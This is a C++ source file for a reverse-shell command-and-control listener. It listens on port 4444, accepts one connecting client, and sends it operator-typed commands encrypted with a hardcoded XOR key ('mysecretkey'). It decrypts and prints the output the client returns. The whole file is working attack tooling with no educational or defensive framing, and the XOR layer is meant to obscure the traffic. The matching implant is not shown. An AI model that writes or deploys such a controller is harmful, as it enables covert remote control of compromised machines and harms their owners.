#include <arpa/inet.h>
#include <iostream>
#include <string>
#include <sys/socket.h>
#include <unistd.h>

#include "encryption.hpp"

const std::string XOR_KEY = "mysecretkey"; // Shared key

constexpr int PORT = 4444;

int main() {
  // 1. Create a TCP socket (IPv4)
  int server_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (server_fd == -1) {
    perror("socket failed");
    return 1;
  }

  int opt = 1;
  setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt,
             sizeof(opt));

  // 2. Define the address to bind to
  sockaddr_in address{};
  address.sin_family = AF_INET;
  address.sin_addr.s_addr = INADDR_ANY; // Listen on all interfaces
  address.sin_port = htons(PORT);       // Convert to network byte order

  // 3. Bind socket to the address
  if (bind(server_fd, (sockaddr *)&address, sizeof(address)) < 0) {
    perror("bind failed");
    return 1;
  }

  // 4. Start listening for connections
  if (listen(server_fd, 3) < 0) {
    perror("listen");
    return 1;
  }
  std::cout << "[+] Listening on port " << PORT << "...\n";

  // 5. Accept one client
  int addrlen = sizeof(address);
  int client_socket =
      accept(server_fd, (sockaddr *)&address, (socklen_t *)&addrlen);
  if (client_socket < 0) {
    perror("accept");
    return 1;
  }

  std::cout << "[+] Client connected!\n";

  // 6. Communicate with client
  while (true) {
    std::string command;
    std::cout << "Shell> ";
    std::getline(std::cin, command);

    // encrypt the command to be sent
    std::string encrypted = xor_encrypt(command, XOR_KEY);

    send(client_socket, encrypted.c_str(), encrypted.size(), 0);

    if (command == "exit")
      break;

    char buffer[4096] = {};
    int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);

    if (bytes_received <= 0)
      break;

    std::string encrypted_output(buffer, bytes_received);
    std::string output = xor_decrypt(encrypted_output, XOR_KEY);

    if (bytes_received > 0) {
      std::cout << "Output:\n" << output << "\n";
    }
  }

  close(client_socket);
  close(server_fd);
  return 0;
}
